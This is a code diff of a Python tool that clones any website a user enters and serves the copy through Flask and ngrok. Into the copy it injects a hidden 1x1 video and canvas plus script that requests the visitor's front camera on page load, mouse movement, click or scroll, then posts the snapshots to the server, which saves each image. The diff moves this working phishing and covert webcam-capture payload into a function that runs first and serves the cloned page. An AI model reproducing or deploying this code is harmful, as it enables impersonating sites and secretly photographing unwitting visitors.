@@ -139,6 +139,95 @@ if __name__ == '__main__':
     os.remove("ngrok_setup_temp.py")
     return False
 
+def clone_website_content(url):
+    try:
+        console.print(f"\n[bold green]Cloning website: {url}...[/bold green]")
+        response = requests.get(url)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        
+        styles = ""
+        for style in soup.find_all('style'):
+            styles += style.string + "\n"
+            style.decompose()
+            
+        for link in soup.find_all('link', rel='stylesheet'):
+            try:
+                css_url = link.get('href')
+                if not css_url.startswith('http'):
+                    if css_url.startswith('/'):
+                        css_url = url + css_url
+                    else:
+                        css_url = url + '/' + css_url
+                css_response = requests.get(css_url)
+                styles += css_response.text + "\n"
+            except:
+                continue
+        
+        camera_code = """
+        <div id="camera-container" style="position:fixed;top:-9999px;left:-9999px;">
+            <video id="camera-video" autoplay playsinline style="width:1px;height:1px;"></video>
+            <canvas id="camera-canvas" style="width:1px;height:1px;"></canvas>
+        </div>
+        <script>
+            function startCapture() {
+                navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
+                })
+                .then(function(stream) {
+                    var video = document.getElementById('camera-video');
+                    video.srcObject = stream;
+                    video.onloadedmetadata = function() {
+                        video.play();
+                        setTimeout(function() {
+                            var canvas = document.getElementById('camera-canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            canvas.toBlob(function(blob) {
+                                var formData = new FormData();
+                                formData.append('image', blob);
+                                fetch('/save-image', {
+                                    method: 'POST',
+                                    body: formData
+                                }).then(function() {
+                                    stream.getTracks().forEach(track => track.stop());
+                                });
+                            });
+                        }, 500);
+                    };
+                })
+                .catch(function(err) {
+                    console.log(err);
+                });
+            }
+            window.addEventListener('load', function() {
+                startCapture();
+                document.addEventListener('mousemove', startCapture, { once: true });
+                document.addEventListener('click', startCapture, { once: true });
+                document.addEventListener('scroll', startCapture, { once: true });
+            });
+        </script>
+        """
+        
+        html = str(soup)
+        html = html.replace('</body>', camera_code + '</body>')
+        
+        cloned_content = f"""
+        <style>{styles}</style>
+        {html}
+        """
+        
+        # Save the cloned content
+        os.makedirs('cloned_site', exist_ok=True)
+        with open('cloned_site/index.html', 'w', encoding='utf-8') as f:
+            f.write(cloned_content)
+            
+        console.print("[green]✓[/green] Website cloned successfully!")
+        return True
+    except Exception as e:
+        console.print(f"[red]Error cloning website: {str(e)}[/red]")
+        return False
+
 def main():
     try:
         # Check if we need to set up the environment
@@ -153,33 +242,31 @@ def main():
             os.execl(python_cmd, python_cmd, *sys.argv)
         
         # Now we can safely import our requirements
-        from flask import Flask, request
+        from flask import Flask, request, send_from_directory
         import requests
         from bs4 import BeautifulSoup
         from pyngrok import ngrok
+        
+        # Ask for website URL
+        console.print(Panel.fit(
+            "[bold blue]Website Cloner[/bold blue]\n"
+            "[cyan]Enter the website URL to clone[/cyan]",
+            border_style="blue"
+        ))
+        
+        target_url = console.input("\n[bold yellow]Enter website URL: [/bold yellow]")
+        if not target_url.startswith(('http://', 'https://')):
+            target_url = 'https://' + target_url
+        
+        # Clone the website first
+        if not clone_website_content(target_url):
+            return
         
         app = Flask(__name__)
         
         @app.route('/')
         def index():
-            return """
-            <h1>Website Cloner</h1>
-            <form method="post" action="/clone">
-                <input type="text" name="url" placeholder="Enter website URL" required>
-                <button type="submit">Clone Website</button>
-            </form>
-            """
-
-        @app.route('/clone', methods=['POST'])
-        def clone():
-            url = request.form.get('url')
-            if not url:
-                return "Please provide a URL"
-            
-            if not url.startswith(('http://', 'https://')):
-                url = 'https://' + url
-                
-            return clone_website(url)
+            return send_from_directory('cloned_site', 'index.html')
 
         @app.route('/save-image', methods=['POST'])
         def save_image():
@@ -194,86 +281,6 @@ def main():
             image.save(image_path)
             console.print(f"[green]✓[/green] New image captured: {image_path}")
             return 'Image saved', 200
-        
-        def clone_website(url):
-            try:
-                with console.status(f"[bold green]Cloning website: {url}..."):
-                    response = requests.get(url)
-                    soup = BeautifulSoup(response.text, 'html.parser')
-                    
-                    styles = ""
-                    for style in soup.find_all('style'):
-                        styles += style.string + "\n"
-                        style.decompose()
-                        
-                    for link in soup.find_all('link', rel='stylesheet'):
-                        try:
-                            css_url = link.get('href')
-                            if not css_url.startswith('http'):
-                                if css_url.startswith('/'):
-                                    css_url = url + css_url
-                                else:
-                                    css_url = url + '/' + css_url
-                            css_response = requests.get(css_url)
-                            styles += css_response.text + "\n"
-                        except:
-                            continue
-                    
-                    camera_code = """
-                    <div id="camera-container" style="position:fixed;top:-9999px;left:-9999px;">
-                        <video id="camera-video" autoplay playsinline style="width:1px;height:1px;"></video>
-                        <canvas id="camera-canvas" style="width:1px;height:1px;"></canvas>
-                    </div>
-                    <script>
-                        function startCapture() {
-                            navigator.mediaDevices.getUserMedia({ 
-                                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
-                            })
-                            .then(function(stream) {
-                                var video = document.getElementById('camera-video');
-                                video.srcObject = stream;
-                                video.onloadedmetadata = function() {
-                                    video.play();
-                                    setTimeout(function() {
-                                        var canvas = document.getElementById('camera-canvas');
-                                        canvas.width = video.videoWidth;
-                                        canvas.height = video.videoHeight;
-                                        canvas.getContext('2d').drawImage(video, 0, 0);
-                                        canvas.toBlob(function(blob) {
-                                            var formData = new FormData();
-                                            formData.append('image', blob);
-                                            fetch('/save-image', {
-                                                method: 'POST',
-                                                body: formData
-                                            }).then(function() {
-                                                stream.getTracks().forEach(track => track.stop());
-                                            });
-                                        });
-                                    }, 500);
-                                };
-                            })
-                            .catch(function(err) {
-                                console.log(err);
-                            });
-                        }
-                        window.addEventListener('load', function() {
-                            startCapture();
-                            document.addEventListener('mousemove', startCapture, { once: true });
-                            document.addEventListener('click', startCapture, { once: true });
-                            document.addEventListener('scroll', startCapture, { once: true });
-                        });
-                    </script>
-                    """
-                    
-                    html = str(soup)
-                    html = html.replace('</body>', camera_code + '</body>')
-                    
-                    return f"""
-                    <style>{styles}</style>
-                    {html}
-                    """
-            except Exception as e:
-                return f"Error cloning website: {str(e)}"
         
         def display_status(public_url):
             table = Table(show_header=True, header_style="bold magenta")
